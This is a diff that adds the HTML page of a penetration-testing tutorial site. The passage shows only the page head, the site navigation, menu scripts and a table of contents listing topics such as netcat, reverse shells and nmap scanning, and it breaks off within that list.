@@ -1,0 +1,3094 @@
+
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Pen Testing">
+      
+      
+      
+        <link rel="canonical" href="https://gagan7248.github.io/HITOP/2026/10/11/pen-testing/">
+      
+      
+      
+        <link rel="next" href="../network-fundamentals/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Pen Testing - HITOP</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  
+
+  
+    
+    
+
+    <meta property="og:site_name" content="HITOP">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Pen Testing">
+
+    
+      <meta property="og:description" content="Pen Testing">
+      <meta name="twitter:description" content="Pen Testing">
+    
+
+    <meta property="og:url" content="https://gagan7248.github.io/HITOP/2026/10/11/pen-testing/">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Pen Testing">
+
+    
+      
+      <meta property="og:image" content="https://gagan7248.github.io/HITOP/images/Pen Testing.png">
+      <meta name="twitter:image" content="https://gagan7248.github.io/HITOP/images/Pen Testing.png">
+    
+  
+
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#module-1-introduction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+
+    <button class="mobile-menu-btn"
+            id="mobile-menu-open"
+            aria-label="Open menu"
+            aria-controls="hitop-mobile-sidebar"
+            aria-expanded="false">
+      ☰
+    </button>
+
+    <a href="../../../.."
+       class="md-header__button md-logo"
+       title="HITOP">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+
+    <div class="hitop-title">HITOP</div>
+
+    <div class="hitop-nav">
+      <a href="../../../..">Home</a>
+      <a href="../../../../category/sops/">SOPs</a>
+      <a href="../../../../category/tutorials/">Tutorials</a>
+      <a href="../../../../category/how-to-guide/">How to Guide</a>
+      <a href="../../../../category/troubleshooting/">Troubleshooting</a>
+      <a href="../../../../about/">About Us</a>
+      <a class="support-btn" href="../../../../support/">Get Support</a>
+    </div>
+
+    <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+    <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    <label class="md-header__button md-icon"
+       for="__search"
+       aria-label="Search"
+       title="Search">
+  <svg xmlns="http://www.w3.org/2000/svg"
+       viewBox="0 0 24 24"
+       width="24"
+       height="24">
+    <path fill="currentColor"
+          d="M9.5 3a6.5 6.5 0 1 0 3.95 11.66l.27.27v.79l5 5 1.5-1.5-5-5h-.79l-.27-.27A6.5 6.5 0 0 0 9.5 3zm0 2a4.5 4.5 0 1 1 0 9 4.5 4.5 0 0 1 0-9z"/>
+  </svg>
+</label>
+
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  </nav>
+</header>
+
+<div class="mobile-menu-overlay" id="mobile-menu-overlay"></div>
+
+<aside class="hitop-mobile-sidebar"
+       id="hitop-mobile-sidebar"
+       aria-label="Mobile navigation"
+       aria-hidden="true">
+  <div class="mobile-sidebar-header">
+    <strong>HITOP Menu</strong>
+    <button id="mobile-menu-close" aria-label="Close menu">×</button>
+  </div>
+
+  <nav class="mobile-sidebar-links">
+    <a href="../../../..">Home</a>
+    <a href="../../../../category/sops/">SOPs</a>
+    <a href="../../../../category/tutorials/">Tutorials</a>
+    <a href="../../../../category/how-to-guide/">How to Guide</a>
+    <a href="../../../../category/troubleshooting/">Troubleshooting</a>
+    <a href="../../../../about/">About Us</a>
+    <a class="mobile-support-btn" href="../../../../support/">Get Support</a>
+  </nav>
+</aside>
+
+<script>
+(function () {
+  const sidebar = document.getElementById("hitop-mobile-sidebar");
+  const overlay = document.getElementById("mobile-menu-overlay");
+  const openBtn = document.getElementById("mobile-menu-open");
+  const closeBtn = document.getElementById("mobile-menu-close");
+
+  if (!sidebar || !overlay || !openBtn || !closeBtn) return;
+
+  function openMenu() {
+    sidebar.classList.add("is-open");
+    overlay.classList.add("is-visible");
+    sidebar.setAttribute("aria-hidden", "false");
+    openBtn.setAttribute("aria-expanded", "true");
+    document.body.classList.add("mobile-menu-active");
+  }
+
+  function closeMenu() {
+    sidebar.classList.remove("is-open");
+    overlay.classList.remove("is-visible");
+    sidebar.setAttribute("aria-hidden", "true");
+    openBtn.setAttribute("aria-expanded", "false");
+    document.body.classList.remove("mobile-menu-active");
+  }
+
+  openBtn.addEventListener("click", openMenu);
+  closeBtn.addEventListener("click", closeMenu);
+  overlay.addEventListener("click", closeMenu);
+
+  document.addEventListener("keydown", function (event) {
+    if (event.key === "Escape") closeMenu();
+  });
+
+  sidebar.querySelectorAll("a").forEach(function (link) {
+    link.addEventListener("click", closeMenu);
+  });
+})();
+</script>
+
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" hidden>
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="HITOP" class="md-nav__button md-logo" aria-label="HITOP" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    HITOP
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Latest Articles
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../404/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    404
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    About
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../support/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Support
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Category
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Category
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/troubleshooting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Troubleshooting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Partials
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Partials
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../partials/article-list/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Article list
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Stylesheets
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Stylesheets
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../stylesheets/test%201/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Test Article - HITOP Documentation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Archive
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Archive
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../archive/2026/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2026
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Categories
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Categories
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/sops/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SOPs
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/tutorials/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tutorials
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/how-to-guide/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    How to Guide
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+                
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#module-1-introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 1 - INTRODUCTION
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#welcome" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WELCOME
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FINDING FILES
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="FINDING FILES">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#quick-file-search-using-a-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quick File Search Using a Database
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#find-location-of-executable-programs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Find Location of Executable Programs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#advanced-file-search-tool" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Advanced File Search Tool
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#services-in-kali" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SERVICES IN KALI
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SERVICES IN KALI">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ssh-service" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SSH SERVICE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-service" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP SERVICE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#service-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SERVICE MANAGEMENT
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#boot-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BOOT PERSISTENCE
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bash-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BASH SHELL
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#scenario-2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SCENARIO 2
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-2-essential-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 2 - ESSENTIAL TOOLS
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 2 - ESSENTIAL TOOLS">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#netcat-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NETCAT -
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#banner-grabbing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BANNER GRABBING
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#netcat-chat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NETCAT CHAT
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#executing-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EXECUTING COMMANDS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bind-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BIND SHELL
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="BIND SHELL">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reverse-shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        REVERSE SHELL
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ncat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NCAT
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wireshark" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        WIRESHARK
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-3-passive-information-gathering" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 3 - PASSIVE INFORMATION GATHERING
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 3 - PASSIVE INFORMATION GATHERING">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#google-search" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GOOGLE SEARCH
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-hacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GOOGLE HACKING
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ghdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GHDB
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#module-4-active-information-gathering" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MODULE 4 - ACTIVE INFORMATION GATHERING
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MODULE 4 - ACTIVE INFORMATION GATHERING">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dns-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        DNS ENUMERATION
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="DNS ENUMERATION">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#forward-dns-lookup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FORWARD DNS LOOKUP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reverse-dns-lookup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        REVERSE DNS LOOKUP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zone-transfers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ZONE TRANSFERS
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PORT SCANNING
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PORT SCANNING">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#connect-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CONNECT SCAN
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#connect-scan_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔌 CONNECT SCAN
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#syn-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SYN SCAN
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#syn-scan_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚡ SYN SCAN
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#udp-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        UDP SCAN
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#udp-scan_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🌊 UDP SCAN
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-implications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NETWORK IMPLICATIONS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NMAP
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="NMAP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#traffic-accountability" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📈 TRAFFIC ACCOUNTABILITY
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#traffic-accountability_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TRAFFIC ACCOUNTABILITY
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#traffic-accountability_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TRAFFIC ACCOUNTABILITY
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-sweeping" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NETWORK SWEEPING
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-sweeping_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧹 NETWORK SWEEPING
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#os-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OS DISCOVERY
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#os-discovery_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OS DISCOVERY
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nse-scripts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NSE SCRIPTS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
